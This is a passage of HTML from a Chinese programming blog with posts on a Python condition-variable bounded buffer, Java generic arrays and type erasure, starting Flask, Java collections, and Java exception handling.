class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock, Event, get_ident, Thread</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">event = Event()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Condition</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.wait_value = <span class="number">0</span>  <span class="comment"># 挂在这个条件变量上的线程数目</span></span><br><span class="line">        <span class="keyword">global</span> event</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wait</span><span class="params">(self, lock)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        把当前线程挂在这个条件变量上</span></span><br><span class="line"><span class="string">        :param lock: 管程的锁。同一时刻只有一个线程能获得管程内的资源</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.wait_value += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"Now we are in the thread: &#123;&#125;, executing wait()"</span>.format(get_ident()))</span><br><span class="line">        lock.release()  <span class="comment"># 释放当前线程的lock，让别的线程有机会被执行</span></span><br><span class="line">        event.wait()  <span class="comment"># 阻塞当前线程</span></span><br><span class="line">        lock.acquire()  <span class="comment"># 请求再次进入管程</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">signal</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        如果有线程挂在这个条件变量上，signal 选择一个唤醒；如果没有这就是个空操作</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> self.wait_value &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"Now we are in the thread: &#123;&#125;, executing signal()"</span>.format(get_ident()))</span><br><span class="line">            event.set()  <span class="comment"># 唤醒一个线程</span></span><br><span class="line">            self.wait_value -= <span class="number">1</span></span><br><span class="line">            event.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BoundBuffer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, max)</span>:</span></span><br><span class="line">        self.count = <span class="number">0</span>  <span class="comment"># 共享资源</span></span><br><span class="line">        self.not_full = Condition()  <span class="comment"># 条件变量</span></span><br><span class="line">        self.not_empty = Condition()  <span class="comment"># 条件变量</span></span><br><span class="line">        self.lock = Lock()  <span class="comment"># 锁</span></span><br><span class="line">        self.buffer = deque()</span><br><span class="line">        self.max = max</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deposit</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.lock.acquire()</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> self.count == self.max:</span><br><span class="line">                self.not_full.wait(self.lock)</span><br><span class="line">            product = randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">            self.buffer.append(product)</span><br><span class="line">            print(<span class="string">"add &#123;&#125; to the buffer"</span>.format(product))</span><br><span class="line">            self.count += <span class="number">1</span></span><br><span class="line">            self.not_empty.signal()</span><br><span class="line">            self.lock.release()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.lock.acquire()</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> self.count == <span class="number">0</span>:</span><br><span class="line">                self.not_empty.wait(self.lock)</span><br><span class="line">            print(<span class="string">"remove &#123;&#125; from the buffer"</span>.format(self.buffer.popleft()))</span><br><span class="line">            self.count -= <span class="number">1</span></span><br><span class="line">            self.not_full.signal()</span><br><span class="line">            self.lock.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    model = BoundBuffer(<span class="number">3</span>)</span><br><span class="line">    generator = Thread(target=model.deposit,)</span><br><span class="line">    comsumer = Thread(target=model.remove,)</span><br><span class="line">    generator.start()</span><br><span class="line">    comsumer.start()</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/10/13/管程/" data-id="ckoqstmak000ngkup3cpws5tj" class="article-share-link">
        分享
      </a>
      
<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/并发编程/">并发编程</a></li></ul>

    </footer>

  </div>

  

  

</article>
    
    <article id="post-Java基础——泛型数组" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
      

<h2 itemprop="name">
  <a class="article-title" href="/2019/01/27/Java基础——泛型数组/">Java 禁止创建泛型数组</a>
</h2>



    </header>
    

    
    <div class="article-meta">
      <a href="/2019/01/27/Java基础——泛型数组/" class="article-date">
  <time datetime="2019-01-27T10:00:45.000Z" itemprop="datePublished">2019-01-27</time>
</a>
      
<div class="article-category">
  <a class="article-category-link" href="/categories/语言/">语言</a>
</div>

    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      
      
      
      <p>java 不允许直接创建泛型数组，也不允许创建泛型实例。也就是说下面这种情况是不被允许的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> T[] a = <span class="keyword">new</span> T[<span class="number">1</span>]; <span class="comment">// error</span></span><br><span class="line">  <span class="keyword">private</span> T t = <span class="keyword">new</span> T(); <span class="comment">// error</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>java 的泛型只停留在了编译层，编译器在编译完成后，会把泛型信息擦除，用第一个限定类型来替代，没有指定限定类型的泛型参数则用 Object 类替代：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 指定了泛型参数的限定类型</span></span><br><span class="line"><span class="keyword">public</span> &lt;T extends Comparable&gt; <span class="function"><span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 经编译器类型擦除后</span></span><br><span class="line"><span class="keyword">public</span> &lt;Comparable&gt; <span class="function"><span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无限定类型</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 经编译器类型擦除后</span></span><br><span class="line"><span class="keyword">public</span> &lt;Object&gt; <span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> </span>&#123;...&#125;</span><br></pre></td></tr></table></figure>
<p>经过类型擦除后，拥有不同泛型参数的泛型类在虚拟机眼中就是一样的了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Test&lt;String&gt; t1 = <span class="keyword">new</span> Test&lt;&gt;();</span><br><span class="line">Test&lt;Integer&gt; t2 = <span class="keyword">new</span> Test&lt;&gt;();</span><br><span class="line">t1.getClass() == t2.getClass(); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>java 允许父类的引用类型指向子类实例，而 Object[ ] 是任何数组的父类，这个时候如果我们往里面放不同于原始数据类型 但是满足后来使用的父类类型的话，编译不会有问题。如果是普通类，这样做也不会有什么问题，因为在运行时会检查加入数组的对象的类型，所以下面这段代码运行时会报错 ArrayStoreException：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String[] s = <span class="keyword">new</span> String[<span class="number">10</span>];</span><br><span class="line">Object[] o = s; <span class="comment">// OK</span></span><br><span class="line">Integer i = <span class="keyword">new</span> Integer(<span class="number">2</span>);</span><br><span class="line">o[<span class="number">0</span>] = i; <span class="comment">// throws ArrayStoreException</span></span><br></pre></td></tr></table></figure>
<p>如果可以创建泛型数组，那么一个 Object 数组引用类型指向这个泛型数组实例是可行的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Test&lt;String&gt;[] tarr = new Test&lt;&gt;[10]; // 实际不行，假设可行</span><br><span class="line">Object[] o = tarr;</span><br></pre></td></tr></table></figure>
<p>编译器编译时会根据引用类型进行类型检查，所以以下代码可以通过编译。在运行时会检查加入数组的对象的类型，但由于类型擦除，不同泛型参数的泛型类在虚拟机眼里是类型相同的，那么在运行时一个 Test<integer> 实例成功被放进 Test<string>[ ] 中了：</string></integer></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Test&lt;Integer&gt; t = <span class="keyword">new</span> Test&lt;&gt;();</span><br><span class="line">o[<span class="number">0</span>] = t;</span><br></pre></td></tr></table></figure>
<p>一个与泛型数组类型不同的实例可以被加入数组中而 java 无法检测到这一错误。那么很显然无法保证泛型数组元素类型的一致性，其后果不言而喻。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/01/27/Java基础——泛型数组/" data-id="ckoqstm9l0005gkupbfok6k6s" class="article-share-link">
        分享
      </a>
      
<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li></ul>

    </footer>

  </div>

  

  

</article>
    
    <article id="post-Flask学习" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
      

<h2 itemprop="name">
  <a class="article-title" href="/2018/11/15/Flask学习/">Flask——启动吧，Flask！</a>
</h2>



    </header>
    

    
    <div class="article-meta">
      <a href="/2018/11/15/Flask学习/" class="article-date">
  <time datetime="2018-11-15T11:00:19.000Z" itemprop="datePublished">2018-11-15</time>
</a>
      
<div class="article-category">
  <a class="article-category-link" href="/categories/Web开发/">Web开发</a>
</div>

    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      
      
      
      <h1 id="新一代虚拟环境工具：pipenv"><a href="#新一代虚拟环境工具：pipenv" class="headerlink" title="新一代虚拟环境工具：pipenv"></a>新一代虚拟环境工具：pipenv</h1><p>以前虚拟环境主要靠 virtualenv， 配合 requirements.txt 做到一键安装依赖的效果。但是 requirements.txt 需要手动管理包记录，每次安装新的包之后都要更新这个文件，很麻烦。现在有了新的工具 pipenv。pipenv 将虚拟环境配置与依赖包管理整合在一起，并自动记录依赖包的安装、更新与卸载。真正做到了”一键使用“。pipenv 的用法参考<a href="https://zhuanlan.zhihu.com/p/37581807" target="_blank" rel="noopener">这篇文章</a>。</p>
<h1 id="启动Flask"><a href="#启动Flask" class="headerlink" title="启动Flask"></a>启动Flask</h1><p>在 Flask 更新到版本 1.0 以后，不再推荐使用下面的方式启动 Flask</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.run()</span><br></pre></td></tr></table></figure>
<p>取而代之的是命令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask run</span><br></pre></td></tr></table></figure>
<p>Flask 根据以下规则会自动探测程序实例：</p>
<ol>
<li>从当前目录寻找 app.py 或 wsgi.py 模块，并从中寻找名为 app 或 application 的实例</li>
<li>从环境变量 FLASK_APP 对应的值寻找名为 app 或 application 的实例</li>
</ol>
<p>例如，如果 Flask 实例 app 位于 hello.py，将 FLASK_APP 设为 hello，Flask 就会在当前目录的 hello.py 模块寻找实例</p>
<p>Flask 默认为生产模式(production mode), 通过环境变量 FLASK_ENV 可以修改为开发模式(debug mode)：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLASK_ENV = development</span><br></pre></td></tr></table></figure>
<p>利用 –host 与 –port 参数可以修改 Flask 运行主机与端口</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flask run --host=0.0.0.0</span><br><span class="line">flask run --port=9000</span><br></pre></td></tr></table></figure>
<p>也可以通过环境变量 FLASK_RUN_HOST 与 FLASK_RUN_PORT 设置。</p>
<p>可以通过 <code>flask --help</code> 查看所有可用命令</p>
<h1 id="管理环境变量"><a href="#管理环境变量" class="headerlink" title="管理环境变量"></a>管理环境变量</h1><p>如果安装了 python-dotenv 包， Flask 会从 .env 文件 和 .flaskenv 文件中加载环境变量。此时 Flask 加载环境变量的优先级是：系统环境变量 &gt; .env 中的环境变量 &gt; .flaskenv 中的环境变量</p>
<p>.env 用于存放公开环境变量, 如 FLAKS_APP, .flaskenv 用于存放敏感环境变量如 Email 账号密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!# MyFlask/.env</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 这是注释</span><br><span class="line">FLASK_APP = hello</span><br></pre></td></tr></table></figure>
<h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><p>用如下命令可以启动带有上下文的 Python Shell 环境：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask shell</span><br></pre></td></tr></table></figure>
<p>和其他 flask 命令相同，在执行这个命令前要确保 Flask 实例可以被找到</p>
<h1 id="flask-命令"><a href="#flask-命令" class="headerlink" title="flask 命令"></a>flask 命令</h1><p>通过为一个函数添加 @app.cli.command() 装饰器，可以注册一个 flask 命令。函数的名称即为命令名，也可以通过给装饰器传参的方式命名：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.cli.command('greet')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    click.echo(<span class="string">'hello!'</span>)</span><br></pre></td></tr></table></figure>
<p>flask 命令是通过 Click 包实现的，更多关于自定义命令的设置和功能请看<a href="http://click.pocoo.org/6/" target="_blank" rel="noopener">Click文档</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/15/Flask学习/" data-id="ckoqstm9j0003gkupbdn148f1" class="article-share-link">
        分享
      </a>
      
<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Flask/">Flask</a></li></ul>

    </footer>

  </div>

  

  

</article>
    
    <article id="post-java程序设计-集合" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
      

<h2 itemprop="name">
  <a class="article-title" href="/2018/06/28/java程序设计-集合/">java基础-使用集合类</a>
</h2>



    </header>
    

    
    <div class="article-meta">
      <a href="/2018/06/28/java程序设计-集合/" class="article-date">
  <time datetime="2018-06-28T12:12:12.000Z" itemprop="datePublished">2018-06-28</time>
</a>
      
<div class="article-category">
  <a class="article-category-link" href="/categories/语言/">语言</a>
</div>

    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      
      
      
      <h1 id="将集合的接口与实现分离"><a href="#将集合的接口与实现分离" class="headerlink" title="将集合的接口与实现分离"></a>将集合的接口与实现分离</h1><p>Java集合类库将<code>接口（interface）</code>与<code>实现（implementation）</code>分离。在使用集合类时，一旦构建了集合就不需要知道究竟使用了哪种实现，因此只有在构建集合对象时使用具体的类才有意义。可以使用<code>接口类型</code>存放集合的引用：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Queue&lt;Customer&gt; expressLane = <span class="keyword">new</span> LinkedListQueue&lt;&gt;();</span><br><span class="line">expressLane.add(<span class="keyword">new</span> Customer(<span class="string">"David"</span>));</span><br></pre></td></tr></table></figure></p>
<p>这样做有利于随时更改实现类型，当发现有更合适的实现类时，只需要修改调用构造器处的代码就可以了：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Queue&lt;Customer&gt; expressLane = <span class="keyword">new</span> CirculArrayQueue&lt;&gt;(<span class="number">100</span>);</span><br></pre></td></tr></table></figure></p>
<h1 id="Collection接口"><a href="#Collection接口" class="headerlink" title="Collection接口"></a>Collection接口</h1><p>集合类的基本接口是<code>Collection接口</code>,这个接口有两个方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Collection</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E element)</span></span>;</span><br><span class="line">    <span class="function">Iterator&lt;E&gt; <span class="title">iterator</span><span class="params">()</span></span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>add方法用于向集合中添加元素。如果添加成功返回true，否则false。<br>iterator方法返回一个实现了Iterator接口的对象，这个对象又称为<code>迭代器</code>，可以用这个迭代器依次访问集合中的元素</p>
<h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><p>Iterator接口包含4个方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Iterator</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function">E <span class="title">next</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">forEachRemaining</span><span class="params">(Consumer&lt;? <span class="keyword">super</span> E&gt; action)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Java迭代器的查找与位置变更是紧密相连的，查找一个元素的唯一方法是调用<code>next()</code>，而在执行查找操作时，迭代器的位置随之向前移动。当调用<code>next()</code>时，迭代器就越过下一个元素并返回刚刚越过的那个元素的引用。而<code>remove()</code>会从迭代器中删除上次调用<code>next()</code>方法时返回的元素。</p>
<p>迭代器应理解为处于两个元素之间，当调用<code>next()</code>时，迭代器就越过下一个元素并返回刚刚越过的那个元素的引用。</p>
<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><p>Java中所有链表都是双向的。对于链表，尽量不使用随机访问而使用遍历操作，否则效率很低。Java提供了LinkedList类，可以很简单实现列表：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; staff = <span class="keyword">new</span> LinkedList&lt;&gt;(); <span class="comment">// LinkedList类实现了List接口</span></span><br><span class="line">staff.add(<span class="string">"Susan"</span>);</span><br><span class="line">staff.add(<span class="string">"David"</span>);</span><br><span class="line">staff.add(<span class="string">"Mike"</span>);</span><br><span class="line">Iterator&lt;String&gt; iterator = staff.iterator();</span><br><span class="line">iterator.next();</span><br><span class="line">iterator.remove();</span><br></pre></td></tr></table></figure></p>
<p>通过<code>add</code>方法可以向链表尾部添加元素。想要在链表中间插入元素，由于迭代器是表述集合中位置的，所以要借助迭代器实现，而只有在有序集合中这样做才有意义，Iterator是使用与所有集合的，所以对于有序集合，Java提供了Iterator的子类ListIterator：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; staff = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">staff.add(<span class="string">"Susan"</span>);</span><br><span class="line">staff.add(<span class="string">"David"</span>);</span><br><span class="line">ListIterator&lt;String&gt; iter = staff.ListIterator();</span><br><span class="line">iter.next();</span><br><span class="line">iter.add(<span class="string">"Mike"</span>); <span class="comment">// 在Susan之后，David之前添加Mike</span></span><br><span class="line">String first = iter.previous();  <span class="comment">// 反向遍历链表</span></span><br><span class="line">iter.remove(); <span class="comment">// 删除被previous越过的元素Mike</span></span><br></pre></td></tr></table></figure></p>
<p><code>set</code>方法用于替换被next或previous越过的元素：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; staff = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">staff.add(<span class="string">"Susan"</span>);</span><br><span class="line">staff.add(<span class="string">"David"</span>);</span><br><span class="line">staff.next();</span><br><span class="line">staff.set(<span class="string">"Mike"</span>); <span class="comment">// Susan被替换为Mike</span></span><br></pre></td></tr></table></figure></p>
<h1 id="泛型数组列表"><a href="#泛型数组列表" class="headerlink" title="泛型数组列表"></a>泛型数组列表</h1><p>在Java中，可以用变量来确定数组的大小：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Employee staff[] = <span class="keyword">new</span> Employee[num];</span><br></pre></td></tr></table></figure></p>
<p>为了达到数组动态变长/缩短的效果，使用泛型数组列表<code>ArrayList</code>。<em>泛型</em>即“参数化类型”、将类型参数化，类似于方法中的变量参数，只是此时类型也定义成参数形式（又称为类型参数）。为了指定数组列表保存的元素对象类型，需要用一对尖括号将类名括起来加在后面：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;Employee&gt; staff = <span class="keyword">new</span> ArrayList&lt;Employee&gt;();</span><br></pre></td></tr></table></figure></p>
<p>用<code>add([int index,]obj)</code>方法往数组列表添加元素，不指定索引则默认加到末尾。<code>remove(int index)</code>删除元素，<code>get(int index)</code>按索引获取元素，<code>set(int index, obj)</code>重置对应索引的元素（不能用于添加元素），<code>size()</code>方法获取ArrayList长度。</p>
<h2 id="将数组列表拷贝到数组"><a href="#将数组列表拷贝到数组" class="headerlink" title="将数组列表拷贝到数组"></a>将数组列表拷贝到数组</h2><p>用<code>toArray()</code>方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X[] a = <span class="keyword">new</span> X[list.size()];</span><br><span class="line">list.toArray(a);</span><br></pre></td></tr></table></figure></p>
<h2 id="泛型化与原始数组列表之间的兼容性"><a href="#泛型化与原始数组列表之间的兼容性" class="headerlink" title="泛型化与原始数组列表之间的兼容性"></a>泛型化与原始数组列表之间的兼容性</h2><p>在编译之后程序会采取去泛型化的措施。也就是说Java中的泛型，只在编译阶段有效。在编译过程中，正确检验泛型结果后，会将泛型的相关信息擦除，并且在对象进入和离开方法的边界处添加类型检查和类型转换的方法。也就是说，泛型信息不会进入到运行时阶段。</p>
<p>对此总结成一句话：泛型类型在逻辑上看以看成是多个不同的类型，实际上都是相同的基本类型ArrayList。</p>
<h1 id="散列集与树集"><a href="#散列集与树集" class="headerlink" title="散列集与树集"></a>散列集与树集</h1><p>散列集的查找性能比数组和链表都要高。散列表为每个对象计算一个数，称为<code>散列码</code>，散列码由对象的实例域产生一个整数，具有不同数据域的对象产生不同的散列码。java提供了<code>set</code>接口，由<code>HashSet</code>类实现。散列迭代器将依次访问所有的桶，由于散列将元素分散在表的各个位置上，所以访问它们的顺序几乎是随机的。</p>
<p>树集<code>TreeSet</code>类与HashSet十分相似，不过在遍历树集中的元素时默认按添加顺序排序。也可以在构造树集时提供一个Comparator改变排序规则。TreeSet类实现了<code>SortedSet</code>接口和<code>NavigableSet</code>接口。</p>
<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><p>队列可以在尾部添加一个元素，在头部删除一个元素。有两个端头的队列称为<code>双端队列</code>，可以在头部和尾部同时添加或删除元素。不支持在队列中间插入元素。java提供了<code>Deque</code>接口并由<code>ArrayDeque</code>和<code>LinkedList</code>类实现，这两个类都提供了双端队列。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/06/28/java程序设计-集合/" data-id="ckoqstma1000cgkupe9k2mcdh" class="article-share-link">
        分享
      </a>
      
<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li></ul>

    </footer>

  </div>

  

  

</article>
    
    <article id="post-Java程序设计—-处理异常" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
      

<h2 itemprop="name">
  <a class="article-title" href="/2018/06/24/Java程序设计—-处理异常/">Java基础—处理异常</a>
</h2>



    </header>
    

    
    <div class="article-meta">
      <a href="/2018/06/24/Java程序设计—-处理异常/" class="article-date">
  <time datetime="2018-06-24T01:39:22.000Z" itemprop="datePublished">2018-06-24</time>
</a>
      
<div class="article-category">
  <a class="article-category-link" href="/categories/语言/">语言</a>
</div>

    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      
      
      
      <p>处理异常的任务就是将控制权从错误产生的地方转移给能够处理这种情况的错误处理器。如果某个方法不能采用正常的途径完成他的任务 ，就可以通过另外一个路径退出方法。在这种情况下，方法并不能返回任何值，而是抛出（throw）一个封装了错误信息的对象，然后这个方法会退出且不返回任何值。</p>
<p>异常又分为<code>受查(check)异常</code>与<code>非受查(uncheck)异常</code>。非受查异常包括Error类异常与RuntimeException类异常，这些异常都是因为程序本身设计不合理产生的，属于逻辑异常。而受查异常表示其他异常，如IOException。处理异常指的是处理受查异常。</p>
<p><img src="http://p1csf090h.bkt.clouddn.com/java/error2412.png" alt="异常分类"></p>
<h1 id="throws-throw抛出异常"><a href="#throws-throw抛出异常" class="headerlink" title="throws/throw抛出异常"></a>throws/throw抛出异常</h1><p>一个方法不仅需要告诉编译器将要返回什么值，还要告诉编译器有可能发生什么错误。所以方法应在其首部声明所有可能抛出的异常，这样可以从首部反映出这个方法可能抛出哪类受查异常。这就要用到<code>throws</code>关键字。例如FileInputStream类的构造器方法可能由于文件不存在而抛出一个FileNotFoundException：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FileInputStream</span><span class="params">(String name)</span> <span class="keyword">throws</span> FileNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>多个Exception之间用 <code>，</code>分开。<br>如果超类方法没有抛出任何异常，那么子类方法也不能抛出异常。</p>
<p>如果要手动抛出一个异常，用关键字<code>throw</code>。首先构造一个异常对象，然后用throw把这个对象抛出就可以了。如抛出一个EOFException：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> EOFException；</span><br></pre></td></tr></table></figure></p>
